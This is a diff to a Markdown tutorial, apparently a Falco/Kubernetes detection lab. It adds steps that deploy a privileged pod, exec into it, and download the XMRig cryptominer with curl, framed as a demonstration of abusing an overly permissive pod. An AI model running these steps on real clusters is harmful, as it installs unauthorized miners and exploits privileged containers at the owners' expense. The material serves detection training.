@@ -132,10 +132,33 @@ Exit your shell:
 ```
 exit
 ```
+
+Delete the pod
+```
+kubectl delete -f security-context-2.yaml
+```
+
+
 ## Installing a cryptominer in an overly-permissive pod
 
 ```
-wget 
+wget https://raw.githubusercontent.com/n1g3ld0ugla5/Falco-Cryptomining-CNCF/main/priviliged-pod.yaml
+```
+
+```
+cat priviliged-pod.yaml
+```
+
+```
+kubectl apply -f priviliged-pod.yaml
+```
+
+```
+kubectl exec -it test-pod-1 -- bash
+```
+
+```
+curl -OL https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz
 ```
 
 
